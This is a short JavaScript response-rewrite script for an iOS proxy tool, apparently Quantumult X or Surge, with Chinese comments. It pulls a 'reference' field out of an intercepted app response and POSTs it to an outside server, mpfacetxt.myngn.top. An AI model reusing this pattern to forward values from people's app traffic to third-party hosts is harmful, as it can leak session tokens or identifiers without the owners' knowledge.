// 解析响应体
let body = $response.body;
let obj = JSON.parse(body);

// 检查并提取'reference'字段
if (obj.reference) {
    let reference = obj.reference;

    // 通过POST请求将'reference'值发送到get_ref.php
    let url = "https://mpfacetxt.myngn.top/get_ref.php";
    let options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ "reference": reference })
    };

    fetch(url, options)
        .then(response => response.json())
        .then(data => {
            if (data.status === "success") {
                $notify("Reference Sent", "Status", "Reference sent successfully!");
            } else {
                $notify("Reference Failed", "Status", "Failed to send reference: " + data.message);
            }
        })
        .catch(error => {
            console.error("Error sending reference:", error);
            $notify("Reference Failed", "Status", "An error occurred: " + error.message);
        });
}

// 放行流量
$done({body});
